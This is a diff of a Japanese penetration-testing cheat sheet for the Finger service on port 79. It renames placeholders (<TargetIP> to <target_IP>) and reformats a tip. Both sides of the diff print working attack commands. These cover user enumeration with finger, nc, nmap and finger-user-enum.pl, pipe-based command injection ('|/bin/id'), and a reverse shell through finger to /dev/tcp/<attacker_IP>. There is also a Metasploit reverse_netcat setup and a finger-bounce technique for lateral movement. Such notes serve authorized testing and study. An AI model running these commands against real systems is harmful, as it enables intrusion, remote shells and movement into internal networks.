@@ -12,8 +12,8 @@
 ## バナーグラブ・バージョン確認
 
 ```zsh
-nc -vn <TargetIP> 79
-sudo nmap -sV -p 79 --script=banner <TargetIP>
+nc -vn <target_IP> 79
+sudo nmap -sV -p 79 --script=banner <target_IP>
 ```
 確認すべき情報：
 - OSバージョン
@@ -26,10 +26,10 @@ sudo nmap -sV -p 79 --script=banner <TargetIP>
 fingerコマンドによるユーザー列挙
 ```zsh
 # ユーザー一覧
-finger @<TargetIP>
+finger @<target_IP>
 
 # 特定ユーザーの情報
-finger <username>@<TargetIP>
+finger <username>@<target_IP>
 ```
 
 >[!NOTE]
@@ -37,20 +37,20 @@ finger <username>@<TargetIP>
 
 fingerコマンド代替
 ```zsh
-echo "<username>" | nc -vn <TargetIP> 79
+echo "<username>" | nc -vn <target_IP> 79
 ```
 
 finger-user-enum.pl（PentestMonkey）
 ```zsh
-finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TargetIP>
-finger-user-enum.pl -u root -t <TargetIP>
+finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <target_IP>
+finger-user-enum.pl -u root -t <target_IP>
 finger-user-enum.pl -U users.txt -T ips.txt
 ```
 
 nmap スクリプト
 ```zsh
-nmap -p 79 --script finger <TargetIP>
-nmap -sV -p 79 --script=banner <TargetIP>
+nmap -p 79 --script finger <target_IP>
+nmap -sV -p 79 --script=banner <target_IP>
 ```
 
 ---
@@ -62,22 +62,22 @@ nmap -sV -p 79 --script=banner <TargetIP>
 一部のFingerサービス実装では、入力のサニタイズが不十分なため、パイプを通じて任意のコマンドを実行できる。
 
 ```zsh
-finger "|/bin/id@<TargetIP>"
-finger "|/bin/ls -a /@<TargetIP>"
+finger "|/bin/id@<target_IP>"
+finger "|/bin/ls -a /@<target_IP>"
 # 失敗時の出力： In real life: ???
 ```
 
 リバースシェル
 ```sh
-finger "|/bin/bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1@<TargetIP>"
+finger "|/bin/bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1@<target_IP>"
 ```
 ### Metasploit でリバースシェル
 
 ```zsh
 use auxiliary/scanner/finger/finger_users
-set RHOSTS <TargetIP>
+set RHOSTS <target_IP>
 set PAYLOAD cmd/unix/reverse_netcat
-set LHOST <AttackerIP>
+set LHOST <attacker_IP>
 set LPORT 4444
 exploit
 ```
@@ -95,4 +95,5 @@ finger user@<CompromisedHost>@<VictimIP>
 finger @<InternalHost>@<ExternalHost>
 ```
 
-> [!TIP] Finger Bounceは、外部から直接アクセスできない内部マシンへのラテラルムーブメントに使える。侵害済みのホストをリレーとして、内部ネットワーク上のFingerサービスへクエリを送る。
+> [!TIP] 
+> Finger Bounceは、外部から直接アクセスできない内部マシンへのラテラルムーブメントに使える。侵害済みのホストをリレーとして、内部ネットワーク上のFingerサービスへクエリを送る。
